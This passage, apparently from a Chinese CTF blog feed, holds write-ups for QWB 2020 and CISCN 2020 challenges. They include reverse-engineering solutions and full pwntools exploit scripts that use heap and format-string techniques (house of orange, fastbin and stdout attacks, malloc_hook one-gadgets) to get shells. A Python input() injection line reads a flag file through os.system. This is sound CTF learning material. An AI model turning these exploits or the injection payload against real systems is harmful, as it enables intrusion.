&quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 27fmtpayload = &quot;&quot;key = 0x4f365 + libc_baseinfo_addr(&#39;key&#39;,key)for i in range(3):    fmtpayload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,55+i)     prev = (key &gt;&gt; i*16) &amp; 0xffffprint(fmtpayload)payload = str(a) + fmtpayloadpayload +=&#39;aaa&#39; + &#39;b&#39; + p64(tag)[0:6] + &#39;\x00&#39;*2 + p64(tag+2)[0:6] + &#39;\x00&#39;*2  + p64(tag+4)[0:6] + &#39;\x00&#39;*2 + p64(tag+6)[0:6] + &#39;\x00&#39;*2s(payload)itr()</code></pre><pre><code class="python">flag{da8836b9e9df3db44fe4bd7f39d4f7ab}</code></pre><h2 id="water-re"><a href="#water-re" class="headerlink" title="water_re"></a><code>water_re</code></h2><p>Ida反编译后的代码比较难看，发现重点数据造成了困难，就采取动态调试。</p><p>基本流程就是，gets一段你输入的flag，读入后用<code>sub_12f0_</code>进行处理，然后给<code>v10</code> <code>v11</code> <code>v12</code>  <code>v13</code> 判断是否相等。其实也就是一个个字符来进行对比。</p><h3 id="sub-12F0-加密函数"><a href="#sub-12F0-加密函数" class="headerlink" title="sub_12F0_加密函数"></a><code>sub_12F0_</code>加密函数</h3><pre><code class="python">_BYTE *__fastcall sub_12F0(_BYTE *a1){  _BYTE *result; // rax  int v2; // esi  __int64 v3; // r8  __int64 v4; // rdx  __int64 v5; // rax  int v6; // ecx  char v7; // r8  char v8; // dl  __asm { endbr64 }  result = (_BYTE *)sub_1090();  if ( (signed int)result &lt;= 0 )    return result;  v2 = (signed int)result;  v3 = (unsigned int)((_DWORD)result - 1);  v4 = 0LL;  do  {    a1[v4] = (a1[v4] ^ byte_4010[(unsigned int)v4 % 7]) + 65;    v5 = v4++;  }  while ( v3 != v5 );  v6 = 0;  do  {    v7 = a1[3];    result = a1 + 3;    do    {      v8 = *(result-- - 1);      result[1] = v8;    }    while ( a1 != result );    v6 += 4;    *a1 = v7;    a1 += 4;  }  while ( v2 &gt; v6 );  return result;}</code></pre><p>动态调试，进行起来很容易看懂。上来就是一个对输入的东西进行一个与<code>byte_4010</code>的字符<code>&#39;Q&#39;, &#39;W&#39;, &#39;B&#39;, &#39;l&#39;, &#39;o&#39;, &#39;g&#39;, &#39;s&#39;</code> 7组来进行一个异或和+65。</p><p>然后下面：</p><pre><code class="python"> while ( v3 != v5 );  v6 = 0;  do  {    v7 = a1[3];    result = a1 + 3;    do    {      v8 = *(result-- - 1);      result[1] = v8;    }    while ( a1 != result );    v6 += 4;    *a1 = v7;    a1 += 4;  }</code></pre><p>只看着让人头大，输入<code>flag{11111111111111111111111111111111111111111}</code> 动态调试一下发现：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/oqoJ2Y.png" srcset="/img/loading.gif" alt></p><p>分析这2组数据就会发现，每次对4个数据为一组进行处理。处理后结果就是原来的： <code>v1 &gt; v2 &gt; v3 &gt; v4</code> 变为 <code>v4 &gt; v1 &gt; v2 &gt; v3</code> 这样的结果。</p><p>然后处理完就给<code>v10</code> <code>v11</code> <code>v12</code>  <code>v13</code> 判断是否相等。这肯定为一串处理过的字符串，ida中也可以找到，直接提取有点害怕提取错，动调时提取一下出来：</p><pre><code class="python">tag1=[0x4C, 0x78, 0x7C, 0x64, 0x54, 0x55, 0x77, 0x65, 0x5C, 0x49,0x76, 0x4E, 0x68, 0x43, 0x42, 0x4F, 0x4C, 0x71, 0x44, 0x4E,0x66, 0x57, 0x7D, 0x49, 0x6D, 0x46, 0x5A, 0x43, 0x74, 0x69,0x79, 0x78, 0x4F, 0x5C, 0x50, 0x57, 0x5E, 0x65, 0x62, 0x44]</code></pre><p>也就是这一段数据。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><p>自己直接手动替换的数据。</p><pre><code class="python">tag1=[0x4C, 0x78, 0x7C, 0x64, 0x54, 0x55, 0x77, 0x65, 0x5C, 0x49,0x76, 0x4E, 0x68, 0x43, 0x42, 0x4F, 0x4C, 0x71, 0x44, 0x4E,0x66, 0x57, 0x7D, 0x49, 0x6D, 0x46, 0x5A, 0x43, 0x74, 0x69,0x79, 0x78, 0x4F, 0x5C, 0x50, 0x57, 0x5E, 0x65, 0x62, 0x44]tag2 = [0x78, 0x7C, 0x64,0x4C,0x55, 0x77, 0x65,0x54, 0x49,0x76, 0x4E,0x5C, 0x43, 0x42, 0x4F,0x68,0x71, 0x44, 0x4E,0x4C,0x57, 0x7D, 0x49,0x66, 0x46, 0x5A, 0x43,0x6D, 0x69,0x79, 0x78, 0x74, 0x5C, 0x50, 0x57, 0x4F,0x65, 0x62, 0x44,0x5E]qwkey = [&#39;Q&#39;, &#39;W&#39;, &#39;B&#39;, &#39;l&#39;, &#39;o&#39;, &#39;g&#39;, &#39;s&#39;]flag = &#39;&#39;i = 0j = 0for i in range(len(tag2)):    if j ==7:        j = 0    flag += chr((tag2[i] - 65) ^ ord(qwkey[j % 7]))    j += 1print(str(flag))</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/7JWt2B.png" srcset="/img/loading.gif" alt><br>估计没有提取全，但是也很容易知道flag了。</p><pre><code class="python">flag{QWB_water_problem_give_you_the_score}</code></pre><h2 id="Just-a-Galgame"><a href="#Just-a-Galgame" class="headerlink" title="Just_a_Galgame"></a><code>Just_a_Galgame</code></h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>题目提醒了是house of orange，那就想着这样利用即可。现在house of orange的思想，统指主要是针对没有free的堆题，其改top chunk，然后申请一个大点的chunk，来进行获取一个进入unsortbin 的堆块。没有如最早的很经典的利用unsortbin attack 和 io 结合来获取shell。</p><p>题目的case2 <code>Invite her to go to a movie.</code> 中：</p><pre><code class="c">  printf(&quot;movie name &gt;&gt; &quot;, &amp;buf);            v4 = atoi((const char *)&amp;buf);            read(0, (void *)(qword_404060[v4] + 0x60), 0x10uLL);</code></pre><p>由于其是在加0x60之后读取，且在case 1 只是malloc(0x68)，所以在此处可以溢出8个字节，改写到 top chunk。</p><p>并且case3：</p><pre><code class="c">  puts(&quot;You are the apple of my eyes too!&quot;);          qword_404098 = (__int64)malloc(0x1000uLL);          ++v12;</code></pre><p>可以给你申请0x1000的堆块，这就可以实现了house of orange。</p><p>在case5中：</p><pre><code class="c">  puts(&quot;\nHotaru: Won&#39;t you stay with me for a while? QAQ\n&quot;);        read(0, &amp;key, 8uLL);    </code></pre><p>会给<code>0x4040A0</code> 读一段数据。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/RNbigg.png" srcset="/img/loading.gif" alt><br>是紧挨着堆块的。然而在case2中在edit时也没有对堆块序号的检查,让个人输入个8 即可取到这里，进行编辑。</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>house of orange来获取一个unsortbin </li><li>申请一个堆块，会在这个old top chunk中，切出一个堆块，其上会存在libc的相关地址</li><li>show一下，泄漏出libc base</li><li>leave <code>__malloc_hook - 0x60</code>的地址在<code>key</code> 处，然后进行编辑这里的数据。</li></ul><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./Just_a_Galgame&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,27411)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def edit(idx,data):    sla(&quot;&gt;&gt;&quot;,&#39;2&#39;)    sla(&#39;idx&#39;,str(idx))    sa(&#39;name&#39;,str(data))def show():    sla(&#39;&gt;&gt;&#39;,&#39;4&#39;)def add():    sla(&#39;&gt;&gt;&#39;,&#39;1&#39;)def add100():    sla(&#39;&gt;&gt;&#39;,&#39;3&#39;)def leave(buf):    sla(&#39;&gt;&gt;&#39;,&#39;5&#39;)    s(str(buf))add()payload = &#39;\x00&#39;*8 + p64(0xd41)edit(0,payload)add100()add()show()ru(&#39;1: &#39;)libc_base = uu64(r(6)) - 0x3ec2a0info_addr(&#39;libc&#39;,libc_base)leave(p64(libc_base + 0x3ebc30 - 0x60))one_rec = 0x4f3c2 + libc_baseedit(8,p64(one_rec))add()itr()</code></pre><p>还是挺简单的，比赛时竟然没有看这个题。</p><h2 id="easypwn"><a href="#easypwn" class="headerlink" title="easypwn"></a>easypwn</h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><pre><code class="c">if ( !mallopt(1, 0) )    exit(-1);</code></pre><ul><li><p>禁用了fastbin，原理就是修改<code>global_max_fast</code> = 0x10</p></li><li><p>存在off by null</p></li><li><p>没有show功能</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3></li><li><p>利用off by null ，修改unsorted bin 的bk为<code>global_max_fast - 0x10</code></p></li><li><p>利用unsorted bin 攻击 <code>global_max_fast</code></p></li><li><p>接着fastbin attack 打io file的stdout，泄漏libc</p></li><li><p>接着fastbin attack打 <code>malloc_hook</code> 为one gadget</p></li></ul><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./easypwn&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;39.101.184.181&#39;,10000)    libc = elf.libc    # libc = ELF(&#39;./libc-easypwn.so&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size):    sla(&#39;choice&#39;,&#39;1&#39;)    sla(&#39;size&#39;,str(size))def edit(idx,data):    sla(&#39;choice&#39;,&#39;2&#39;)    sla(&#39;idx&#39;,str(idx))    sa(&#39;tent&#39;,str(data))def delete(idx):    sla(&#39;ice&#39;,&#39;3&#39;)    sla(&#39;idx&#39;,str(idx))def leak_addr():    add(0x30) #0    add(0x98) #1    add(0xf0) #2    add(0x98) #3    add(0x40)    delete(0)    #null off by one    edit(1,&#39;d&#39;*0x90 + p64(0xa0 + 0x40))    delete(2)    add(0xe8 - 0x30)    add(0xe8)    add(0x20)    delete(2)    payload = p64(0) * 7 * 2 + p64(0) + p64(0xf1) +p64(0)+ p16(0x57f8- 0x10) + &#39;\n&#39;    edit(1,payload)    add(0xe8)    delete(2)    payload = p64(0) * 7 * 2 + p64(0) + p64(0xf1) + p16(0x45cf) + &#39;\n&#39;    edit(1,payload)    add(0xe8)    add(0xe8)    edit(6, &#39;b&#39; * 0x41 + p64(0xfbad3c80) + p64(0) * 3 + p8(0) + &#39;\n&#39;)leak = 0while True:    try:        leak_addr()        ss = io.recvuntil(chr(0x7f),timeout = 0.5)        if len(ss) == 0:            raise Exception(&#39;&#39;)        io.recv(10)        leak = uu64(r(6))        if leak == 0x7ff81b57b6a3:            raise Exception(&#39;&#39;)        break    except Exception:        io.close()        io = process(&#39;./easypwn&#39;)        # io = remote(&#39;39.101.184.181&#39;,10000)        continueinfo_addr(&#39;leak&#39;,leak)libc_addr = leak - 0x3c56a3info_addr(&#39;libc_base&#39;,libc_addr)delete(2)edit(1, p64(0) * 7 * 2 + p64(0) + p64(0xf1) + p64(libc_addr + libc.symbols[&#39;_IO_2_1_stdin_&#39;] + 143) + &#39;\n&#39;)add(0xe8)add(0xe8)edit(7,&#39;\0&#39; * 0xe1 + p32(0xf1) + &#39;\n&#39;)delete(2)edit(1, p64(0) * 7 * 2 + p64(0) + p64(0xf1) + p64(libc_addr + libc.symbols[&#39;_IO_2_1_stdin_&#39;] + 376) + &#39;\n&#39;)add(0xe8)add(0xe8)rec = libc_addr + 0xf0364# realloc = libc_addr + libc.symbols[&#39;realloc&#39;] + realloc[1]payload = &#39;\x00&#39; * 0xa0 + p64(rec) + p64(rec) + &#39;\n&#39;edit(8, payload)info_addr(&#39;libc_base&#39;,libc_addr)add(0xe8)itr()# 0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)# constraints:#   rax == NULL# 0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)# constraints:#   [rsp+0x30] == NULL# 0xf0364 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)# constraints:#   [rsp+0x50] == NULL# 0xf1207 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)# constraints:#   [rsp+0x70] == NULL</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;强网杯2020-部分题目&quot;&gt;&lt;a href=&quot;#强网杯2020-部分题目&quot; class=&quot;headerlink&quot; title=&quot;强网杯2020 部分题目&quot;&gt;&lt;/a&gt;强网杯2020 部分题目&lt;/h1&gt;&lt;h2 id=&quot;babymessage&quot;&gt;&lt;a href=&quot;#ba
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>cicsn 2020初赛部分题目</title>
    <link href="http://chumen77.xyz/2020/08/20/cicsn%202020%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/"/>
    <id>http://chumen77.xyz/2020/08/20/cicsn 2020初赛部分题目/</id>
    <published>2020-08-20T15:03:02.238Z</published>
    <updated>2020-09-09T02:08:02.489Z</updated>
    
    <content type="html"><![CDATA[<h1 id="cicsn-2020初赛部分题目"><a href="#cicsn-2020初赛部分题目" class="headerlink" title="cicsn 2020初赛部分题目"></a>cicsn 2020初赛部分题目</h1><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="z3"><a href="#z3" class="headerlink" title="z3"></a>z3</h3><p>￼<br>看起来像是非齐次线性方程，那就是就是一个解方程:</p><pre><code class="python">from numpy import *import numpy as npa = np.array([[12, 53, 6,34,58,36,1],            [83,85,12,73,27,96,52],            [78,53,24,36,86,25,46],            [39,78,52,9,62,37,84],            [23,6,14,74,48,12,83],            [27,85,92,42,48,15,72],            [4,6,3,67,0,26,68]])b = np.array([[20247],[40182],[36315],[36518],[26921],[39185],[16546]])result=[]x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[12094],[25270],[19330],[18540],[16386],[21207],[11759]])x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[10460],[25613],[21135],[24891],[18305],[27415],[12855]])x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[10899],[24927],[20670],[22926],[18006],[23345],[12602]])x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[12304],[26622],[19807],[22747],[14233],[24736],[10064]])x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[14169],[35155],[28962],[33273],[21796],[35185],[14877]])x = np.linalg.solve(a, b)result += x.tolist()flag=&#39;&#39;for i in result:    for f in i:        flag+=chr(int(f+0.5))print(flag)</code></pre><h3 id="hyperthreading"><a href="#hyperthreading" class="headerlink" title="hyperthreading"></a>hyperthreading</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>主程序很简单，要求输入42位的flag。</p><pre><code>  Handles = CreateThread(0, 0, StartAddress, 0, 0, 0);  v5 = CreateThread(0, 0, loc_401200, 0, 0, 0);  CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_401240, 0, 0, 0);  WaitForMultipleObjects(2u, &amp;Handles, 1, 0xFFFFFFFF);</code></pre><p>这里开始开多线程。</p><pre><code>void __stdcall __noreturn sub_401240(LPVOID lpThreadParameter){  while ( !IsDebuggerPresent() )    ;  puts((int)&quot;debug!\n&quot;);  exit(0);}</code></pre><p>这里面分别有一个反调试。用的IsDebuggerPresent。<br>￼￼￼￼￼￼￼￼<br>还有对你输入的东西进行处理，处理完以后与</p><pre><code>402150 key             db 0DDh,5Bh,9Eh,1Dh,20h,9Eh,90h,91h,2 dup(90h),91h.rdata:00402150                                         ; DATA XREF: main1+96↑r.rdata:00402150                 db 92h,0DEh,8Bh,11h,0D1h,1Eh,9Eh,8Bh,51h,11h.rdata:00402150                 db 50h,51h,8Bh,9Eh,2 dup(5Dh),11h,8Bh,90h,12h,91h.rdata:00402150                 db 50h,12h,0D2h,91h,92h,1Eh,9Eh,90h,0D2h,9Fh</code></pre><p>这42个数据进行对比。</p><p>那么思路就是过了反调试，定位关键处理输入的代码处，进行确定其是怎么操作数据的，但是看了一会没有找到，就开始想办法寻找字符映射来碰撞flag。</p><pre><code>1 &gt; 0x922 &gt; 0xd23 &gt; 0x124 &gt; 0x515 &gt; 0x916 &gt; 0xd17 &gt; 0x118 &gt; 0x509&gt; 0x900 &gt; 0x52a &gt; 0x9ec &gt; 0x1ed &gt; 0x5d s &gt; 0x22- &gt; 0x8bf &gt; 0xddl &gt; 0x5ba &gt; 0x9eg &gt; 0x1d</code></pre><pre><code>key = [0xDD, 0x5B, 0x9E, 0x1D, 0x20, 0x9E, 0x90,  0x91, 0x90, 0x90,   0x91, 0x92, 0xDE, 0x8B, 0x11, 0xD1, 0x1E, 0x9E, 0x8B, 0x51,   0x11, 0x50, 0x51, 0x8B, 0x9E, 0x5D, 0x5D, 0x11, 0x8B, 0x90,   0x12, 0x91, 0x50, 0x12, 0xD2, 0x91, 0x92, 0x1E, 0x9E, 0x90,   0xD2, 0x9F]</code></pre><p>然后进行一位位替换，获得flag：</p><pre><code>flag{a959951b-76ca-4784-add7-93583251ca92}</code></pre><p>主程序很简单，要求输入42位的flag。</p><pre><code>  Handles = CreateThread(0, 0, StartAddress, 0, 0, 0);  v5 = CreateThread(0, 0, loc_401200, 0, 0, 0);  CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_401240, 0, 0, 0);  WaitForMultipleObjects(2u, &amp;Handles, 1, 0xFFFFFFFF);</code></pre><p>开始新的线程：</p><pre><code>void __stdcall __noreturn sub_401240(LPVOID lpThreadParameter){  while ( !IsDebuggerPresent() )    ;  puts((int)&quot;debug!\n&quot;);  exit(0);}</code></pre><p>这有一个反调试。用的IsDebuggerPresent，过的办法很简单，在x64dbg中在进入IsDebuggerPresent时，输入dbh，隐藏调试器即可。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/BPs5Q6.png" srcset="/img/loading.gif" alt></p><p>测试在这里dbh即可。<br>￼￼￼￼￼￼￼￼<br>还有对你的input进行处理，处理完以后与<br><img src="http://qiqianyun.chumen77.xyz/uPic/vXxpNH.png" srcset="/img/loading.gif" alt></p><p>这42个数据进行对比。</p><p>先过了反调试，定位关键处理输入的代码处（0x401223），进行确定其是怎么操作数据的，看了一会发现没有如此简单，但是发现你输入特定字符，经过程序处理出来的都是一样的:</p><p>随意输入<code>flag{==2332311111111111111111122222222211}</code></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/vXXqPj.png" srcset="/img/loading.gif" alt></p><p>可以打印字符不算多，这就可以可以建立一个映射表：<br>输入<code>flag{1234567890qwertyuiopasdfghjkbnmmmmmm}</code></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/3GOgJx.png" srcset="/img/loading.gif" alt></p><p>处理完：<br><img src="http://qiqianyun.chumen77.xyz/uPic/zsN4o0.png" srcset="/img/loading.gif" alt><br>获取映射表：</p><pre><code>1 &gt; 0x922 &gt; 0xd23 &gt; 0x124 &gt; 0x515 &gt; 0x916 &gt; 0xd17 &gt; 0x118 &gt; 0x509&gt; 0x900 &gt; 0x52f &gt; 0xddl &gt; 0x5ba &gt; 0x9eg &gt; 0x1da &gt; 0x9ec &gt; 0x1ed &gt; 0x5d s &gt; 0x22- &gt; 0x8b</code></pre><p>提取一下key：</p><pre><code>key = [0xDD, 0x5B, 0x9E, 0x1D, 0x20, 0x9E, 0x90,  0x91, 0x90, 0x90,  0x91, 0x92, 0xDE, 0x8B, 0x11, 0xD1, 0x1E, 0x9E, 0x8B, 0x51,   0x11, 0x50, 0x51, 0x8B, 0x9E, 0x5D, 0x5D, 0x11, 0x8B, 0x90,   0x12, 0x91, 0x50, 0x12, 0xD2, 0x91, 0x92, 0x1E, 0x9E, 0x90, 0xD2, 0x9F]</code></pre><p>然后进行一位位替换，获得flag：</p><pre><code>flag{a959951b-76ca-4784-add7-93583251ca92}</code></pre><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>可以确定一下ida无法识别的数据段，是被花指令处理过了。<br><img src="http://qiqianyun.chumen77.xyz/uPic/yY437o.png" srcset="/img/loading.gif" alt><br>这里开始往下识别异常，在动态调试后，提取一下正确的汇编代码，根据正确的算法进行patch掉花指令。（还是注意dbh隐藏一下调试器。）</p><pre><code class="c">void __stdcall __noreturn sub_401120(LPVOID lpThreadParameter){  int v1; // ebx  CreateThread(0, 0, hHandle, 0, 0, 0);  WaitForSingleObject(hHandle, 0xFFFFFFFF);  inputs[0] = (inputs[0] &lt;&lt; 6) ^ ((signed int)(unsigned __int8)inputs[0] &gt;&gt; 2);  inputs[0] ^= 0x23u;  Sleep(6u);  v1 = *(unsigned __int8 *)(__readfsdword(0x30u) + 2);  inputs[0] += 0x23;  JUMPOUT(loc_4011EC);}</code></pre><p>Patch 后的，勉强可以看懂。其中肯定是<code>inputs[i]</code>进行处理的，其中也有一个地方在加1。</p><pre><code class="python">key = [    0xDD, 0x5B, 0x9E, 0x1D, 0x20, 0x9E, 0x90, 0x91, 0x90, 0x90,     0x91, 0x92, 0xDE, 0x8B, 0x11, 0xD1, 0x1E, 0x9E, 0x8B, 0x51,     0x11, 0x50, 0x51, 0x8B, 0x9E, 0x5D, 0x5D, 0x11, 0x8B, 0x90,     0x12, 0x91, 0x50, 0x12, 0xD2, 0x91, 0x92, 0x1E, 0x9E, 0x90,     0xD2, 0x9F]flag = &#39;&#39;for i in range(len(key)):    key[i] -= 0x23    key[i] &amp;= 0xff #有可能运算后会小于0的，所以给处理一下    key[i] ^= 0x23    key[i] = ((key[i] &gt;&gt; 6) ^ (key[i] &lt;&lt; 2)) &amp; 0xff    flag += chr(key[i])print(flag)</code></pre><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="easybox"><a href="#easybox" class="headerlink" title="easybox"></a>easybox</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>ubuntu 16，off by one，没有show函数，需要攻击stdout泄漏libc地址。</p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><ul><li>用off by one，构造出chunk overlapping ,并且想办法释放堆块，让<code>main_arena_</code>落在fastbin中</li><li>修改这个<code>main_arena_</code>的最后2个字节，让其指向<code>stdout</code>附近带有<code>0x7f</code>的地址（属于0x70的fastbin堆块）</li><li>使用chunk overlapping ，来修改空闲的fastbin chain，使其中一个指向这个带有<code>main_arena</code>的堆块，进行fastbin attack，修改到stdout处的内容，leak libc</li><li>重复以上的步骤，构造一个堆块到<code>malloc_hook</code>处，写上one gadget 即可。</li></ul><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *import timelocal_file  = &#39;./pwn&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;101.200.53.148&#39;,34521)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def alloca(idx,size,data):    sla(&quot;&gt;&quot;,&#39;1&#39;)    sla(&#39;idx&#39;,str(idx))    sla(&#39;len&#39;,str(size))    sa(&#39;content&#39;,str(data))def free(idx):    sla(&#39;&gt;&gt;&gt;&#39;,&#39;2&#39;)    sla(&#39;idx&#39;,str(idx))# def pwn():def leak_addr():    alloca(0,1,&#39;aa&#39;)    alloca(1,0x4f0,&#39;\xdd\xd5&#39;)    alloca(2,0xb0,&#39;aa&#39;)    alloca(3,0x60,&#39;aa&#39;)    free(0)    alloca(0,0x18,&#39;/bin/sh\x00&#39;*2 + p64(0) + &#39;\xc1&#39;)    free(1)    alloca(1,0x60,&#39;\xdd\xd5&#39;)    alloca(4,0x60,&#39;\x50\x47&#39;)    alloca(5,0x60,&#39;\x50\x47&#39;)    alloca(6,0x60,&#39;\x50\x47&#39;)    alloca(7,0x30,&#39;aa&#39;)    alloca(8,0x160,&#39;aaaaaa&#39;)    alloca(9,0x60,&#39;aa&#39;)    alloca(10,0x30,&#39;aa&#39;)    free(7)    alloca(0,0x38, p64(0) * 7 + &#39;\xe1&#39;)    free(8)    free(4)    free(9)    free(5)    payload = &#39;a&#39; * 0x160    alloca(11,0x180,payload)    payload = &#39;a&#39; * 0x160 + p64(0) + p64(0x71) + &#39;\x20&#39;    alloca(11,0x180,payload)    alloca(12,0x60,&#39; &#39;)    # debug()    alloca(13,0x60,&#39; &#39;)    alloca(14,0x60,&#39;\xed\xca&#39;)    payload = &#39;a&#39; * 3 + p64(0) * 6 + p64(0xfbad3c80)+p64(0)*3+p8(0)    alloca(15,0x60,payload)# leak_addr()leak = 0while True:    try:        leak_addr()        ss = io.recvuntil(chr(0x7f),timeout = 0.5)        if len(ss) == 0:            raise Exception(&#39;&#39;)        io.recv(10)        leak = uu64(r(6))        if leak == 0x7ff81b57b6a3:            raise Exception(&#39;&#39;)        break    except Exception:        io.close()        io = process(&#39;./pwn&#39;)        # io = remote(&#39;101.200.53.148&#39;,34521)        continueinfo_addr(&#39;leak&#39;,leak)libc_base = leak - 0x3c56a3info_addr(&#39;libc_base&#39;,libc_base)rec = 0xf1207 + libc_basedef getshell():    alloca(7,0x60,&#39; &#39;)    alloca(8,0x60,&#39; &#39;)    free(0)    free(11)    free(6)    alloca(5,0x60,&#39; &#39;)    alloca(4,0x60,&#39; &#39;)    alloca(0,0x60,&#39;\xed\xca&#39;)    free(4)    free(13)    free(12)    payload = &#39;a&#39; * 0x80 + p64(0) + p64(0x71) + &#39;\x90&#39;    alloca(13,0x90,payload)    alloca(11,0x60,&#39;\x20\xd0&#39;)    alloca(6,0x60,&#39;\x20\xd0&#39;)    alloca(4,0x60,&#39;\x20\xd0&#39;)    payload = &#39;a&#39; * 3 + p64(0) * 2 + p64(rec)    alloca(5,0x60,payload)    # debug()    sleep(0.1)    # alloca(8,30,&#39;1&#39;)getshell()itr()</code></pre><p>深夜写的exp，估计构造堆块的思路有点混乱。🤣🤣</p><h3 id="babyjsc"><a href="#babyjsc" class="headerlink" title="babyjsc"></a>babyjsc</h3><p>比赛时没有做出来，开始以为是个webpwn，不敢去做。但是很多队伍做出来了，试着去做，看到server.py,不了解jsc，以为只能执行js代码，废了很大精力写js来读取flag，还是没有成功。tcl。</p><p>最后看wp，知道了input函数本身就是个漏洞函数，其会将stdin输入的内容当做python代码去执行（就像执行计算式一样，将其看做python代码，通过计算返回结果）。当然可以用它来执行命令，不过需要先倒入os的模块，然后执行系统命令。</p><pre><code class="python">__import__(&#39;os&#39;).system(&#39;cat /home/ctf/flag&#39;)</code></pre><p>对于python，input函数漏洞，参考链接：<br><a href="https://blog.csdn.net/weixin_34221332/article/details/92713257" target="_blank" rel="noopener">https://blog.csdn.net/weixin_34221332/article/details/92713257</a></p><h3 id="no-free"><a href="#no-free" class="headerlink" title="no 